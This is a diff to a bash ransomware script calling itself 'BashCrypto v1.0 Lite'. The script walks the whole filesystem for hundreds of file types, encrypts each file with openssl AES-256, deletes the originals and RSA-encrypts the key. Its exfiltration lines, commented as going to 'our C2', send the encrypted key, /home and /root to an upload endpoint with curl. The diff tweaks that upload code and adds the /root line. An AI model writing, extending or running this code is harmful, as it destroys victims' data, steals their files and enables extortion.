@@ -50,7 +50,7 @@ fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" 
           "*.tpu" "*.tpx" "*.tu" "*.tur" "*.vc" "*.yab" "*.8ba" "*.8bc" "*.8be" "*.8bf" "*.8bi8" "*.bi8" "*.8bl" "*.8bs" \
           "*.8bx" "*.8by" "*.8li" "*.aip" "*.amxx" "*.ape" "*.api" "*.mxp" "*.oxt" "*.qpx" "*.qtr" "*.xla" "*.xlam" "*.xll" \
           "*.xlv" "*.xpt" "*.cfg" "*.cwf" "*.dbb" "*.slt" "*.bp2" "*.bp3" "*.bpl" "*.clr" "*.dbx" "*.jc" "*.potm" "*.ppsm" \
-          "*.prc" "*.prt" "*.shw" "*.std" "*.ver" "*.wpl" "*.xlm" "*.yps" "*.md3" "*.1cd" "*.owned")
+          "*.prc" "*.prt" "*.shw" "*.std" "*.ver" "*.wpl" "*.xlm" "*.yps" "*.md3" "*.1cd")
 
 fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
           "/bin/netstat" "/bin/mount" "/bin/kill" \
@@ -71,7 +71,7 @@ chmod 755 /root/key.bin
 for ((num=0; num<"${#fileExts[@]}"; num++))
 do
   for file in $(find / -name "${fileExts[${num}]}")
-  do 
+  do
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
 
     rm -rf  ${file} &>/dev/null
@@ -128,5 +128,6 @@ openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root
 rm -rf /root/key.bin
 
 # Exfil files to our C2
-tar czf - /root/key.bin.enc | curl -k -A "BashCrypto v1.0 Lite" -d "unique_id=${genKey}" -F "uploadFile=@-" https://192.168.1.132/upload.php
-tar czf - /home/ | curl -k -A "BashCrypto v1.0 Lite" -d "unique_id=${genKey}" -F "uploadFile=@-" https://192.168.1.132/upload.php
+tar czf - /root/key.bin.enc | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=enc_key.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
+tar czf - /home/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=home.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
+tar czf - /root/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=root.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
